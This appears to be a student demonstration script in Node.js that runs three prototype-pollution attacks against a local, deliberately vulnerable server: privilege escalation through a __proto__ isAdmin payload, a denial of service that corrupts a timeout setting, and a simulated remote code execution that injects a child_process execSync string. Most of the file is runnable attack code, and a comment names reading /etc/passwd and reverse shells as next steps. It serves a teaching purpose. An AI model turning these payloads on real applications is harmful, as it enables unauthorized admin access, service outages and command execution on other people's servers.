/**
 * =====================================================================
 *  EXPLOIT SCRIPT â€” Prototype Pollution Full Attack Demo
 *  Demonstrates: Privilege Escalation + DoS + RCE
 *
 *  Target: http://localhost:3000 (server-vulnerable.js)
 *  Run:    node exploits/exploit-all.js
 *
 *  WARNING: For educational purposes only.
 * =====================================================================
 */

const http = require('http');

const TARGET = 'localhost';
const PORT = 3000;

// -------------------------------------------------------
// Helper: send HTTP request, return parsed response
// -------------------------------------------------------
function request(method, path, body = null) {
  return new Promise((resolve, reject) => {
    const payload = body ? JSON.stringify(body) : null;
    const options = {
      hostname: TARGET,
      port: PORT,
      path,
      method,
      headers: {
        'Content-Type': 'application/json',
        ...(payload ? { 'Content-Length': Buffer.byteLength(payload) } : {})
      }
    };

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve({ status: res.statusCode, body: JSON.parse(data) });
        } catch {
          resolve({ status: res.statusCode, body: data });
        }
      });
    });

    req.on('error', reject);
    if (payload) req.write(payload);
    req.end();
  });
}

// -------------------------------------------------------
// Pretty print helpers
// -------------------------------------------------------
function banner(title) {
  const line = 'â•'.repeat(60);
  console.log(`\nâ•”${line}â•—`);
  console.log(`â•‘  ${title.padEnd(58)}â•‘`);
  console.log(`â•š${line}â•`);
}

function step(n, text) {
  console.log(`\n  [STEP ${n}] ${text}`);
}

function result(label, value, success = null) {
  const icon = success === true ? 'âœ…' : success === false ? 'âŒ' : 'â†’';
  console.log(`  ${icon}  ${label}: ${JSON.stringify(value)}`);
}

function printPayload(payload) {
  console.log('\n  ğŸ“¦ Payload sent:');
  console.log('  ' + JSON.stringify(payload, null, 2).split('\n').join('\n  '));
}

// =====================================================================
//  ATTACK 1: PRIVILEGE ESCALATION
//  Inject isAdmin=true into Object.prototype via /api/update-profile
//  Then access /api/admin with a fresh empty object
// =====================================================================
async function attack1_privilegeEscalation() {
  banner('ATTACK 1: PRIVILEGE ESCALATION');
  console.log('  Goal: Gain admin access without credentials');
  console.log('  Vector: POST /api/update-profile with __proto__ payload');

  // Step 1: Confirm we are NOT admin before attack
  step(1, 'Confirm access DENIED before attack');
  const before = await request('GET', '/api/admin');
  result('Admin access (before)', before.body.access, before.status === 403);

  // Step 2: Send the prototype pollution payload
  step(2, 'Send Prototype Pollution payload');
  const payload = {
    username: 'alice',
    updates: {
      '__proto__': {
        isAdmin: true,
        role: 'admin'
      }
    }
  };
  printPayload(payload);

  const pollute = await request('POST', '/api/update-profile', payload);
  result('Server response', pollute.body.message);

  // Step 3: Verify Object.prototype is now polluted
  step(3, 'Verify prototype pollution locally');
  const testObj = {};
  console.log(`  â†’ new empty object {}.isAdmin = ${testObj.isAdmin}`);
  console.log(`  â†’ new empty object {}.role    = ${testObj.role}`);
  console.log(`  â†’ Object.prototype.isAdmin    = ${Object.prototype.isAdmin}`);

  // Step 4: Access admin endpoint â€” should now be GRANTED
  step(4, 'Access /api/admin with no credentials');
  const after = await request('GET', '/api/admin');
  result('Admin access (after)', after.body.access, after.status === 200);

  if (after.body.secretData) {
    console.log(`\n  ğŸš© FLAG CAPTURED: ${after.body.secretData}`);
  }

  // Cleanup: reset pollution for next attack
  delete Object.prototype.isAdmin;
  delete Object.prototype.role;

  return after.status === 200;
}

// =====================================================================
//  ATTACK 2: DENIAL OF SERVICE (DoS)
//  Pollute Object.prototype.timeout with a non-numeric value
//  This corrupts server config and causes 500 errors on all requests
// =====================================================================
async function attack2_dos() {
  banner('ATTACK 2: DENIAL OF SERVICE (DoS)');
  console.log('  Goal: Crash server logic by corrupting configuration');
  console.log('  Vector: POST /api/settings with __proto__.timeout = "CORRUPTED"');

  // Step 1: Normal request works fine
  step(1, 'Confirm /api/settings works normally before attack');
  const before = await request('POST', '/api/settings', { timeout: 30 });
  result('Normal response', before.body, before.status === 200);

  // Step 2: Send DoS payload â€” pollute timeout type
  step(2, 'Send DoS payload â€” pollute timeout with a string value');
  const payload = {
    '__proto__': {
      timeout: 'CORRUPTED_BY_ATTACKER'
    }
  };
  printPayload(payload);

  const pollute = await request('POST', '/api/settings', payload);
  result('Pollution response status', pollute.status);
  result('Server error', pollute.body.error || pollute.body, pollute.status === 500);

  // Step 3: Now any fresh object inherits the corrupted timeout
  step(3, 'Verify all subsequent settings requests are broken');
  const victim = await request('POST', '/api/settings', { debug: true });
  result('Victim request status', victim.status, victim.status === 500);
  result('Server error message', victim.body.error || victim.body);

  console.log('\n  ğŸ’¥ Server settings endpoint is now fully broken for all users!');
  console.log('  â†’ The server must be RESTARTED to recover from this attack.');

  // Cleanup
  delete Object.prototype.timeout;

  return pollute.status === 500;
}

// =====================================================================
//  ATTACK 3: REMOTE CODE EXECUTION (RCE) SIMULATION
//  Pollute Object.prototype.dangerousOption which is read by the
//  template renderer, simulating how pug/jade pass options to eval()
// =====================================================================
async function attack3_rce() {
  banner('ATTACK 3: REMOTE CODE EXECUTION (RCE) SIMULATION');
  console.log('  Goal: Inject a command that reaches the template engine eval()');
  console.log('  Vector: POST /api/update-profile â†’ then GET /api/render');
  console.log('  Note:   Server simulates RCE safely without executing real commands');

  // Step 1: Pollute Object.prototype.dangerousOption
  step(1, 'Inject RCE payload via prototype pollution');
  const payload = {
    username: 'bob',
    updates: {
      '__proto__': {
        dangerousOption: "process.mainModule.require('child_process').execSync('id')"
      }
    }
  };
  printPayload(payload);

  const pollute = await request('POST', '/api/update-profile', payload);
  result('Pollution injected', pollute.status === 200, pollute.status === 200);

  // Step 2: Trigger the render endpoint â€” it creates a fresh {} for options
  // That empty object inherits dangerousOption from Object.prototype
  step(2, 'Trigger template renderer â€” empty options {} inherits polluted property');
  const render = await request('POST', '/api/render', {
    template: 'dashboard',
    options: {}  // empty â€” but inherits dangerousOption!
  });

  result('Render response status', render.status);
  console.log('\n  ğŸ“„ Server render output:');
  console.log('  ' + (typeof render.body === 'string' ? render.body : JSON.stringify(render.body)));

  const success = typeof render.body === 'string' && render.body.includes('RCE Triggered');
  if (success) {
    console.log('\n  ğŸ’€ RCE PAYLOAD REACHED THE TEMPLATE ENGINE!');
    console.log('  â†’ In a real pug server, this would execute arbitrary OS commands.');
    console.log('  â†’ Attacker can run: id, whoami, cat /etc/passwd, reverse shells...');
  }

  // Cleanup
  delete Object.prototype.dangerousOption;

  return success;
}

// =====================================================================
//  MAIN: Run all attacks in sequence
// =====================================================================
async function main() {
  console.log('\n');
  console.log('â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— ');
  console.log('â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—');
  console.log('â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘');
  console.log('â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘');
  console.log('â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•   â–ˆâ–ˆâ•‘   â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•');
  console.log('â•šâ•â•     â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•    â•šâ•â•    â•šâ•â•â•â•â•â• ');
  console.log('       PROTOTYPE POLLUTION â€” FULL EXPLOIT DEMO');
  console.log('       Marwa Hoshia & Fatima Abu Abed');
  console.log('       Azrieli College of Engineering\n');

  // Check server is running
  try {
    await request('GET', '/');
  } catch (err) {
    console.error('âŒ Cannot connect to server at localhost:3000');
    console.error('   Make sure server-vulnerable.js is running first:');
    console.error('   $ node src/server-vulnerable.js\n');
    process.exit(1);
  }

  const results = {};

  try { results.attack1 = await attack1_privilegeEscalation(); } catch (e) { console.error('Attack 1 error:', e.message); results.attack1 = false; }
  try { results.attack2 = await attack2_dos(); } catch (e) { console.error('Attack 2 error:', e.message); results.attack2 = false; }
  try { results.attack3 = await attack3_rce(); } catch (e) { console.error('Attack 3 error:', e.message); results.attack3 = false; }

  // Final summary
  const line = 'â•'.repeat(60);
  console.log(`\nâ•”${line}â•—`);
  console.log(`â•‘  EXPLOIT SUMMARY`.padEnd(61) + 'â•‘');
  console.log(`â• ${line}â•£`);
  console.log(`â•‘  Attack 1 â€” Privilege Escalation : ${results.attack1 ? 'âœ… SUCCESS' : 'âŒ FAILED '}`.padEnd(61) + 'â•‘');
  console.log(`â•‘  Attack 2 â€” Denial of Service    : ${results.attack2 ? 'âœ… SUCCESS' : 'âŒ FAILED '}`.padEnd(61) + 'â•‘');
  console.log(`â•‘  Attack 3 â€” RCE Simulation        : ${results.attack3 ? 'âœ… SUCCESS' : 'âŒ FAILED '}`.padEnd(61) + 'â•‘');
  console.log(`â•š${line}â•\n`);
}

main();
